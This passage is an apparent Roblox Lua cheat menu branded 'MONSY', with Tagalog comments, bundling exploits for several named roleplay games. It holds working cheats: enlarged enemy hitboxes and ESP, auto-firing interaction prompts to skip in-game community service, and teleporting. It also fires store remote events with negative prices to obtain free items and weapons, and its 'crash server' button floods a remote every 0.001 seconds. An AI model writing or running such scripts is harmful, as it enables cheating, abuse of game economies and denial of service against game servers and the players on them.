    SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
    Circle.Radius = _G.HeadSize * 5
end

SliderButton.MouseButton1Down:Connect(function()
    draggingSize = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        draggingSize = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if draggingSize and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = UIS:GetMouseLocation()
        local relativeX = mousePos.X - SliderBack.AbsolutePosition.X
        local percent = math.clamp(relativeX / SliderBack.AbsoluteSize.X, 0, 1)
        updateSize(percent)
    end
end)

local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.52, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.Font = Enum.Font.RobotoMono
ToggleButton.TextSize = 14
ToggleButton.Text = "Size : Enabled"
round(ToggleButton, 10)

ToggleButton.MouseButton1Click:Connect(function()
    _G.Disabled = not _G.Disabled
    ToggleButton.Text = "Size : " .. (_G.Disabled and "Disabled" or "Enabled")
end)

local FOVToggle = Instance.new("TextButton", Frame)
FOVToggle.Size = UDim2.new(0.8, 0, 0, 30)
FOVToggle.Position = UDim2.new(0.1, 0, 0.68, 0)
FOVToggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
FOVToggle.TextColor3 = Color3.fromRGB(0,0,0)
FOVToggle.Font = Enum.Font.RobotoMono
FOVToggle.TextSize = 14
FOVToggle.Text = "FOV: Visible"
round(FOVToggle, 10)

local fovHidden = false
FOVToggle.MouseButton1Click:Connect(function()
    fovHidden = not fovHidden
    Circle.Visible = not fovHidden
    FOVToggle.Text = "FOV: " .. (fovHidden and "Hidden" or "Visible")
end)

local ESPToggle = Instance.new("TextButton", Frame)
ESPToggle.Size = UDim2.new(0.8, 0, 0, 30)
ESPToggle.Position = UDim2.new(0.1, 0, 0.84, 0)
ESPToggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
ESPToggle.TextColor3 = Color3.fromRGB(0,0,0)
ESPToggle.Font = Enum.Font.RobotoMono
ESPToggle.TextSize = 14
ESPToggle.Text = "ESP: Enabled"
round(ESPToggle, 10)

ESPToggle.MouseButton1Click:Connect(function()
    ESP_ENABLED = not ESP_ENABLED
    ESPToggle.Text = "ESP: " .. (ESP_ENABLED and "Enabled" or "Disabled")
    
    if not ESP_ENABLED then
        for player, _ in pairs(ESP_Outlines) do
            removeESP(player)
        end
    else
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                createESP(player)
            end
        end
    end
end)

UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end

    if input.KeyCode == Enum.KeyCode.L then
        _G.Disabled = not _G.Disabled
        if ToggleButton then
            ToggleButton.Text = "Size : " .. (_G.Disabled and "Disabled" or "Enabled")
        end
    end

    if input.KeyCode == Enum.KeyCode.L then
        ESP_ENABLED = not ESP_ENABLED
        if ESPToggle then
            ESPToggle.Text = "ESP: " .. (ESP_ENABLED and "Enabled" or "Disabled")
        end
        
        if not ESP_ENABLED then
            for player, _ in pairs(ESP_Outlines) do
                removeESP(player)
            end
        else
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    createESP(player)
                end
            end
        end
    end
end) 

local GUI_OPEN = true

UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end

    if input.KeyCode == Enum.KeyCode.K then
        GUI_OPEN = not GUI_OPEN
        Frame.Visible = GUI_OPEN
    end
end)

updateSize((_G.HeadSize - 1) / 34)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO AFK COMSERV (MONSY)", function()
	-- BYPASS COMSERVE — FULL WHITE THEME + BLACK TEXT ONLY
-- Mas maliit, mas malinis, 100% gumagana pa rin

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- GLOBALS
_G.InstantEnabled = false
_G.TeleportEnabled = false
_G.TriggerEnabled = false
_G.AnimationEnabled = false
_G.CameraEnabled = false

-- CAMERA SHAKE
local Camera = workspace.CurrentCamera
local cameraConnection

local function setupCamera()
    if cameraConnection then cameraConnection:Disconnect() end
    cameraConnection = RunService.RenderStepped:Connect(function()
        if not _G.CameraEnabled then return end
        local flip = math.sign(math.sin(tick() * 25)) * 0.15
        Camera.CFrame = Camera.CFrame * CFrame.new(flip, 0, 0)
    end)
end

-- INSTANT E
local instantConns = {}
local function setupInstant()
    for _, v in workspace:GetDescendants() do
        if v:IsA("ProximityPrompt") then v.HoldDuration = 0 end
    end
    instantConns.added = workspace.DescendantAdded:Connect(function(v)
        if v:IsA("ProximityPrompt") then v.HoldDuration = 0 end
    end)
    instantConns.input = UserInputService.InputBegan:Connect(function(i,gp)
        if gp or i.KeyCode ~= Enum.KeyCode.E then return end
        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        for _, p in workspace:GetDescendants() do
            if p:IsA("ProximityPrompt") and p.Enabled then
                if (p.Parent.Position - hrp.Position).Magnitude <= p.MaxActivationDistance then
                    fireproximityprompt(p)
                end
            end
        end
    end)
end

-- TRIGGER
local triggerConn, reconnectTask
local function setupTrigger()
    local indexes = {1024,1023,1013,1014,1018,1017,1028,1025,1026,1031,1027,1016}
    local cleaningSpot = workspace:FindFirstChild("CleaningSpot")

    local function getPrompts()
        local t = {}
        for _, i in indexes do
            local part = workspace:FindFirstChild(tostring(i))
            if part then
                local p = part:FindFirstChild("ProximityPrompt")
                if p then table.insert(t, p) end
            end
        end
        if cleaningSpot and cleaningSpot:FindFirstChild("ProximityPrompt") then
            table.insert(t, cleaningSpot.ProximityPrompt)
        end
        return t
    end

    triggerConn = RunService.Heartbeat:Connect(function()
        if not _G.TriggerEnabled then return end
        for _, p in getPrompts() do fireproximityprompt(p, 0) end
    end)
end

-- ANIMATION BYPASS
local animConns = {}
local function setupAnimation()
    local function onChar(char)
        local hum = char:WaitForChild("Humanoid")
        local animate = char:WaitForChild("Animate")
        for _, sec in {"idle","fall","climb","toolnone","sit","freefall"} do
            local s = animate:FindFirstChild(sec)
            if s then for _, a in s:GetChildren() do if a:IsA("StringValue") then a.AnimationId = "" end end end
        end
        local conn = RunService.Heartbeat:Connect(function()
            if not _G.AnimationEnabled then return end
            for _, track in hum:GetPlayingAnimationTracks() do
                local id = track.Animation.AnimationId:lower()
                if not (id:find("walk") or id:find("run") or id:find("swim")) and track.Priority ~= Enum.AnimationPriority.Movement then
                    track:Stop(0)
                end
            end
        end)
        animConns[char] = conn
    end
    if player.Character then onChar(player.Character) end
    animConns.added = player.CharacterAdded:Connect(onChar)
end

-- GUI — PURE WHITE + BLACK TEXT
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 260, 0, 290)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.new(1,1,1)     -- PURE WHITE
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 18)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,50)
title.BackgroundTransparency = 1
title.Text = "BYPASS COMSERVE"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.Parent = frame

-- Toggle Creator (White + Black Text)
local function createToggle(name, y, var, on, off)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0,140,0,36)
    lbl.Position = UDim2.new(0,20,0,y)
    lbl.BackgroundTransparency = 1
    lbl.Text = name
    lbl.TextColor3 = Color3.new(0,0,0)
    lbl.Font = Enum.Font.Roboto
    lbl.TextSize = 16
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = frame

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0,62,0,32)
    bg.Position = UDim2.new(1,-82,0,y+2)
    bg.BackgroundColor3 = Color3.fromRGB(230,230,230)
    bg.Parent = frame
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0,16)

    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0,28,0,28)
    knob.Position = UDim2.new(0,4,0.5,-14)
    knob.BackgroundColor3 = Color3.new(1,1,1)
    knob.Parent = bg
    Instance.new("UICorner", knob).CornerRadius = UDim.new(0,14)

    bg.InputBegan:Connect(function(i)
        if i.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
        _G[var] = not _G[var]
        if _G[var] then
            knob.Position = UDim2.new(1,-32,0.5,-14)
            bg.BackgroundColor3 = Color3.fromRGB(100,200,100)
            if on then on() end
        else
            knob.Position = UDim2.new(0,4,0.5,-14)
            bg.BackgroundColor3 = Color3.fromRGB(230,230,230)
            if off then off() end
        end
    end)
end

-- Create All Toggles
createToggle("INSTANT INTERACT", 60, "InstantEnabled", setupInstant, function()
    for _,c in instantConns do if c.Connected then c:Disconnect() end end
    instantConns = {}
end)

createToggle("TELEPORT", 100, "TeleportEnabled", function()
    local pos = CFrame.new(503.67, 4.95, -765.29)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = pos
    end
end)

createToggle("AUTO TRIGGER", 140, "TriggerEnabled", setupTrigger, function()
    if triggerConn then triggerConn:Disconnect() end
end)

createToggle("NO ANIMATION", 180, "AnimationEnabled", setupAnimation, function()
    for _,c in animConns do if c.Connected then c:Disconnect() end end
    animConns = {}
end)

createToggle("CAMERA SHAKE", 220, "CameraEnabled", setupCamera, function()
    if cameraConnection then cameraConnection:Disconnect() end
end)

-- Close Button
local close = Instance.new("TextButton")
close.Size = UDim2.new(0,36,0,36)
close.Position = UDim2.new(1,-46,0,8)
close.BackgroundColor3 = Color3.new(1,1,1)
close.Text = "X"
close.TextColor3 = Color3.new(0,0,0)
close.Font = Enum.Font.Roboto
close.TextSize = 20
close.Parent = frame
Instance.new("UICorner", close).CornerRadius = UDim.new(0,12)

close.MouseButton1Click:Connect(function()
    _G.InstantEnabled = false _G.TeleportEnabled = false
    _G.TriggerEnabled = false _G.AnimationEnabled = false _G.CameraEnabled = false
    gui:Destroy()
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["NEW RP SCRIPT"]
	if not panel then return end

	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local hover = t.bg:Lerp(t.accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local base = t.bg:Lerp(t.accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

addMainMenuButton("SANTA ROSA AUTO FARM + FAST MONEY (WHITELISTED)", function()
	
end)

addMainMenuButton("SANTA ROSA ROLEPLAY AUTO BUY FOOD (MONSY)", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ────────────────────────────────────────────────────────────────
--  Create ScreenGui
-- ────────────────────────────────────────────────────────────────
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = ""
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

-- ────────────────────────────────────────────────────────────────
--  Main Frame (MALIIT NA WHITE BOX)
-- ────────────────────────────────────────────────────────────────
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 190, 0, 220)
Main.Position = UDim2.new(0.5, -95, 0.5, -110)
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 14)
UICorner.Parent = Main

-- Shadow (mas maliit din)
local Shadow = Instance.new("ImageLabel")
Shadow.Size = UDim2.new(1, 30, 1, 30)
Shadow.Position = UDim2.new(0, -15, 0, -15)
Shadow.BackgroundTransparency = 1
Shadow.Image = "rbxassetid://6014261993"
Shadow.ImageColor3 = Color3.new(0,0,0)
Shadow.ImageTransparency = 0.7
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(49,49,450,450)
Shadow.ZIndex = -1
Shadow.Parent = Main

-- ────────────────────────────────────────────────────────────────
--  Title (mas maliit font)
-- ────────────────────────────────────────────────────────────────
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1,0,0,35)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.RobotoMono
Title.Text = "MONSY"
Title.TextColor3 = Color3.fromRGB(30, 30, 30)
Title.TextSize = 20
Title.FontFace = Font.new("rbxasset://fonts/families/RobotoMono.json", Enum.FontWeight.Bold)
Title.Parent = Main

-- ────────────────────────────────────────────────────────────────
--  Dragging (title pa rin)
-- ────────────────────────────────────────────────────────────────
local dragging, dragInput, dragStart, startPos

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- ────────────────────────────────────────────────────────────────
--  Buy function
-- ────────────────────────────────────────────────────────────────
local function BuyItem(itemName)
    local args = { [1] = itemName }
    
    local success, err = pcall(function()
        game:GetService("ReplicatedStorage")
            :WaitForChild("24/7ConvenienceStore", 9e9)
            :WaitForChild("StorePurchaseEvent", 9e9)
            :FireServer(unpack(args))
    end)
    
    if not success then
        warn("Failed to buy " .. itemName .. " → " .. tostring(err))
    end
end

-- ────────────────────────────────────────────────────────────────
--  Buttons (mas maliit at compact)
-- ────────────────────────────────────────────────────────────────
local items = {
    {name = "Sandwich", text = "Sandwich"},
    {name = "Cola",     text = "Cola"},
    {name = "Chips",    text = "Chips"},
    {name = "Water",    text = "Water"},
}

local yOffset = 45

for _, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.88, 0, 0, 38)
    btn.Position = UDim2.new(0.06, 0, 0, yOffset)
    btn.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
    btn.BorderSizePixel = 0
    btn.Font = Enum.Font.RobotoMono
    btn.Text = item.text
    btn.TextColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextSize = 15
    btn.AutoButtonColor = false
    btn.Parent = Main
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 9)
    corner.Parent = btn
    
    -- Hover / click effects
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(225, 225, 225)}):Play()
    end)
    
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(240, 240, 240)}):Play()
    end)
    
    btn.MouseButton1Click:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3 = Color3.fromRGB(200, 200, 200)}):Play()
        task.delay(0.1, function()
            TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(240, 240, 240)}):Play()
        end)
        BuyItem(item.name .. "Btn")
    end)
    
    yOffset = yOffset + 43
end
end)

addMainMenuButton("MAHARLIKA CRASH SERVER (WHITELISTED)", function()
	-- MONSY rounded white GUI - positioned LEFT TOP (medyo taas)
-- with 0.001s spam delay

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remove old GUI
for _, gui in playerGui:GetChildren() do
    if gui.Name == "" then
        gui:Destroy()
    end
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = ""
mainFrame.Size = UDim2.new(0, 180, 0, 110)
mainFrame.Position = UDim2.new(0, 40, 0, 80)  -- LEFT SIDE + MEDYO TOP
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 18)
mainCorner.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Name = ""
title.Size = UDim2.new(1, 0, 0, 34)
title.BackgroundTransparency = 1
title.Font = Enum.Font.RobotoMono
title.Text = "MONSY"
title.TextColor3 = Color3.fromRGB(0, 0, 0)
title.TextSize = 20
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = mainFrame

local separator = Instance.new("Frame")
separator.Size = UDim2.new(1, -20, 0, 1)
separator.Position = UDim2.new(0, 10, 0, 33)
separator.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
separator.BorderSizePixel = 0
separator.Parent = mainFrame

local toggleBtn = Instance.new("TextButton")
toggleBtn.Name = ""
toggleBtn.Size = UDim2.new(0, 140, 0, 42)
toggleBtn.Position = UDim2.new(0.5, 0, 1, -15)
toggleBtn.AnchorPoint = Vector2.new(0.5, 1)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.BorderSizePixel = 0
toggleBtn.Font = Enum.Font.RobotoMono
toggleBtn.Text = "START"
toggleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
toggleBtn.TextSize = 17
toggleBtn.Parent = mainFrame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 12)
btnCorner.Parent = toggleBtn

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 26, 0, 26)
closeBtn.Position = UDim2.new(1, -28, 0, 4)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "×"
closeBtn.TextColor3 = Color3.fromRGB(140, 140, 140)
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.TextSize = 22
closeBtn.Parent = mainFrame

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Dragging
local dragging = false
local dragInput
local dragStart
local startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then updateInput(input) end
end)

-- Toggle + 0.001s spam
local isActive = false

toggleBtn.MouseButton1Click:Connect(function()
    isActive = not isActive
    
    if isActive then
        toggleBtn.Text = "STOP"
        warn("[MONSY] ON - Spam started (0.001s delay)")
        
        task.spawn(function()
            while isActive do
                local rs = game:GetService("ReplicatedStorage")
                local remote = rs:FindFirstChild("BuyItemRemote")
                
                if remote and remote:IsA("RemoteEvent") then
                    remote:FireServer("Boba Tea UwU", -0.001)
                    remote:FireServer("Raw Burger", -0.001)
                end
                
                wait(0.001)
            end
        end)
    else
        toggleBtn.Text = "START"
        warn("[MONSY] OFF - Spam stopped")
    end
end)
end)

addMainMenuButton("D'SOURCE CITY ROLEPLAY (MONSY)", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = ""
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

-- Main Frame (container)
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 190, 0, 280)  -- maliit pa rin pero sapat para sa scroll
Main.Position = UDim2.new(0.5, -95, 0.5, -140)
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderSizePixel = 0
Main.Parent = ScreenGui

local UICornerMain = Instance.new("UICorner")
UICornerMain.CornerRadius = UDim.new(0, 14)
UICornerMain.Parent = Main

-- Title Bar
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 34)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.RobotoMono
Title.Text = "MONSY"
Title.TextColor3 = Color3.fromRGB(20, 20, 20)
Title.TextSize = 20
Title.FontFace = Font.new("rbxasset://fonts/families/RobotoMono.json", Enum.FontWeight.SemiBold)
Title.Parent = Main

-- ScrollingFrame (dito ilalagay yung buttons)
local Scrolling = Instance.new("ScrollingFrame")
Scrolling.Size = UDim2.new(1, -10, 1, -44)  -- space para sa title
Scrolling.Position = UDim2.new(0, 5, 0, 39)
Scrolling.BackgroundTransparency = 1
Scrolling.BorderSizePixel = 0
Scrolling.ScrollBarThickness = 6
Scrolling.ScrollBarImageColor3 = Color3.fromRGB(180, 180, 180)
Scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)  -- ia-adjust auto
Scrolling.Parent = Main

-- Dragging (title pa rin)
local dragging, dragInput, dragStart, startPos

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Buy function
local function Buy(itemName)
    pcall(function()
        game:GetService("ReplicatedStorage")
            :WaitForChild("BuyItemRemote", 5)
            :FireServer(itemName, -1)
    end)
end

-- Items
local items = {
    "AmmoBox",
    "Handcuffs",
    "Heavy Helmet",
    "Heavy Vest",
    "MED-KIT",
    "Oxy",
    "PISTOL",
    "Pill",
    "SP-PISTOL",
    "Skorpion"
}

-- Create buttons inside ScrollingFrame
local yOffset = 8
for _, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -16, 0, 36)
    btn.Position = UDim2.new(0, 8, 0, yOffset)
    btn.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
    btn.BorderSizePixel = 0
    btn.Font = Enum.Font.RobotoMono
    btn.Text = item
    btn.TextColor3 = Color3.fromRGB(30, 30, 30)
    btn.TextSize = 14
    btn.AutoButtonColor = false
    btn.Parent = Scrolling

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn

    -- hover
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.16), {BackgroundColor3 = Color3.fromRGB(220, 220, 220)}):Play()
    end)

    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.16), {BackgroundColor3 = Color3.fromRGB(235, 235, 235)}):Play()
    end)

    -- click
    btn.MouseButton1Click:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3 = Color3.fromRGB(200, 200, 200)}):Play()
        task.delay(0.12, function()
            TweenService:Create(btn, TweenInfo.new(0.16), {BackgroundColor3 = Color3.fromRGB(235, 235, 235)}):Play()
        end)
        Buy(item)
    end)

    yOffset = yOffset + 42  -- spacing
end

-- Auto-update CanvasSize para perfect scroll
Scrolling.CanvasSize = UDim2.new(0, 0, 0, yOffset + 10)
end)

addMainMenuButton("PRESTIGE ROLEPLAY SPAWN GUN (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PRESTIGE ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"SP", "SP"},
    {"Glock-19", "Glock-19"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GunStoreFolder.BuyTool:FireServer(selectedItem, -0)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(2)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("PRESTIGE ROLEPLAY SPAWN OXY (MONSY)", function()
	game:GetService("ReplicatedStorage").GiveAyuda:FireServer("Silenced Pistol", -0)
end)

addMainMenuButton("PRESTIGE ROLEPLAY CONFISCATE (MONSY)", function()
	--// SERVICES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

